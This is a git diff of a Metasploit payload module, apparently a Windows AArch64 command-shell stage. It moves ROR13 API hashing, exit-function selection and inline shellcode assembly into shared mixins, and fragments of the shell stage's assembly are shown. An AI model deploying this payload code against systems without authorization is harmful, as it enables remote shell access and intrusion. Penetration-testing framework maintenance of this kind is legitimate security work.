@@ -7,6 +7,8 @@
 
 module MetasploitModule
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::Aarch64
+  include Msf::Payload::Windows::Exitfunk_Aarch64
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -37,51 +39,14 @@ module MetasploitModule
   end
 
   def generate_stage(_opts = {})
-    exit_hash = exitfunk_hash(datastore['EXITFUNC'])
-    asm = build_stage_asm(
-      exit_lo: exit_hash & 0xFFFF,
-      exit_hi: (exit_hash >> 16) & 0xFFFF
-    )
+    asm = build_stage_asm(exitfunk: datastore['EXITFUNC'])
     compile_aarch64(asm)
   end
 
   private
 
-  def ror13_hash(str)
-    h = 0
-    str.each_byte do |b|
-      h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
-      h = (h + b) & 0xFFFFFFFF
-    end
-    h
-  end
-
-  def exitfunk_hash(value)
-    case value.to_s.downcase
-    when 'thread'
-      ror13_hash('ExitThread')
-    when 'process', '', 'seh'
-      0x78b5b983 # TerminateProcess
-    when 'none'
-      ror13_hash('ExitProcess')
-    else
-      0x78b5b983
-    end
-  end
-
-  def compile_aarch64(asm_string)
-    require 'aarch64/parser'
-    parser = ::AArch64::Parser.new
-    asm = parser.parse(without_inline_comments(asm_string))
-    asm.to_binary
-  end
-
-  def without_inline_comments(string)
-    string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
-  end
-
-  def build_stage_asm(exit_lo:, exit_hi:)
-    <<~ASM
+  def build_stage_asm(exitfunk:)
+    asm = <<~ASM
       main:
         mov     x22, x0
         sub     sp, sp, #0x100
@@ -193,17 +158,7 @@ module MetasploitModule
         ldr     x9, [x29, #0x40]
         blr     x9
         add     sp, sp, #0xB0
-      exitfunk:
-        ldr     x3, [x29, #0x00]
-        movz    w0, ##{format('0x%04x', exit_lo)}
-        movk    w0, ##{format('0x%04x', exit_hi)}, lsl #16
-        ldr     x9, [x29, #0x08]
-        blr     x9
-        mov     x10, x0
-        movn    x0, #0
-        mov     w1, wzr
-        blr     x10
-        brk     #0
     ASM
+    asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
   end
 end
